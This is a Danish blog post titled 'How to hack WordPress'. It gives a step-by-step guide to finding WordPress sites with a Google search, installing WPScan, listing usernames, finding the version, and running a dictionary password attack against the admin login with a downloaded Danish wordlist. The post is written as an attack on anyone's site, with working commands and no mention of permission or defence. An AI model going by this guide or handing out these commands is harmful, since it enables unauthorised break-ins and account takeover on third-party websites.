---
title: Sådan hacker du WordPress.
layout: post
date: 2017-04-10 17:21:29
category: WordPress, Hack
tags: [WordPress, Hack]
---

WordPress udgør små [25%](https://w3techs.com/blog/entry/wordpress-powers-25-percent-of-all-websites) af internettet, vi bevæger os rundt på til dagligt. Så hvordan hacker du de små 25% af internetter? Det er overraskende nemt.

Hvis du har problemer med at finde en WordPress side, så kan en simpel Google søgning være behjælpelig.

```
"index of" inurl:wp-content
```

Til denne exploit benytter vi [WpScan](https://github.com/wpscanteam/wpscan). Som er en af de bedste vulnerability testere til WordPress. Et tools som Hydra eller Jack-the-ripper, ville også have været en mulighed, men for simpliciteten skyld benytter vi WpScan.

Udover skal vi bruge en god *wordlist*, til det man kalder et *dictinary attack*. Der ganske enkelte går ud på at prøve en samling af kodeord op imod WordPress siden. Du finder en samling på min Github her.

[Wordlists](https://github.com/mikejakobsen/dictionary-attack)

WpScan er opbygget i Ruby, så hvis du ikke allerede har Ruby installeret, finder du et script til at installere det, samt WpScan herunder.
```bash
cd ~
curl -sSL https://rvm.io/mpapis.asc | gpg --import -
curl -sSL https://get.rvm.io | bash -s stable
source ~/.rvm/scripts/rvm
echo "source ~/.rvm/scripts/rvm" >> ~/.bashrc
rvm install 2.3.3
rvm use 2.3.3 --default
echo "gem: --no-ri --no-rdoc" > ~/.gemrc
gem install bundler
git clone https://github.com/wpscanteam/wpscan.git
cd wpscan
gem install bundler
bundle install --without test
```

Her du Ruby og RVM sat op, kan du nøjes med nedenstående.

```bash
git clone https://github.com/wpscanteam/wpscan.git
cd wpscan
sudo gem install bundler && bundle install --without test
```
Så kommer vi til den sjove del.

```bash
ruby wpscan.rb --url http://wordpress-site.com
```

```bash
ruby wpscan.rb --url http://wordpress-site.com --enumerate u
```
Eller du kan navigere til **http://wordpress-site.com/?author=1** i din browser.

Er du nysgerrig, omkring hvilken WordPress version du har med at gøre, kan du næsten altid blot navigere til **http://wordpress-site.com/readme.html** for at se nærmere.

Dernæst cloner vi det føromtalte Git Repo med kodeord ned, så det er klar.

```bash
cd ~
git clone https://github.com/mikejakobsen/dictionary-attack.git
```

```bash
ruby wpscan.rb --url http://wordpress-site.com --wordlist ~/dictionary-attack/danish.dic --username admin
```
Her erstatter du selvfølgelig admin med et af de brugernavne, som din første scan viste.
